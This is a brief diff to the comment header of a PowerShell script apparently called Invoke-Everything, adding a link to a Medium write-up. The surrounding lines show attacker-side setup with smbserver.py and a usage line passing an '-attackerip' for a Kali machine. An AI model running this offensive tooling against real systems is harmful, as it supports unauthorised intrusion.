@@ -23,6 +23,8 @@ smbserver.py -smb2support share .
 
 To run Script Invoke-Everything -attackerip <kali ip>
 
+More information can be found here https://overgrowncarrot1.medium.com/invoke-everything-ps1-66734832598
+
 #>
       [cmdletbinding()] Param(
         
